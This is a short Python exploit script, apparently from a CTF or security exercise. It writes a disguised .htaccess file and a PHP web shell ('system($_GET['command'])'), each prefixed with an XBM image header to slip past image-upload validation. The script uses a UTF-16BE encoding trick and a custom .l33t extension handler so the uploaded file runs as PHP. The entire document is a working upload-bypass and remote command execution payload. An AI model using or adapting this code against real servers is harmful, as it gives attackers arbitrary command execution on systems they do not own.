
# Will prove the file is a legit xbitmap file and the size is 1337x1337
SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"

def generate_php_file(filename, script):
	phpfile = open(filename, 'wb') 
	phpfile.write(SIZE_HEADER)
	phpfile.write(script.encode('utf-16be'))
	

	phpfile.close()

def generate_htacess():
	htaccess = open('.htaccess', 'wb')

	htaccess.write(SIZE_HEADER)
	htaccess.write(b'AddType application/x-httpd-php .l33t\n')
	htaccess.write(b'php_value zend.multibyte 1\n')
	htaccess.write(b'php_value zend.detect_unicode 1\n')
	htaccess.write(b'php_value display_errors 1\n')

	htaccess.close()
		
generate_htacess()

generate_php_file("payload.l33t", "<?php system($_GET['command']); die(); ?>")
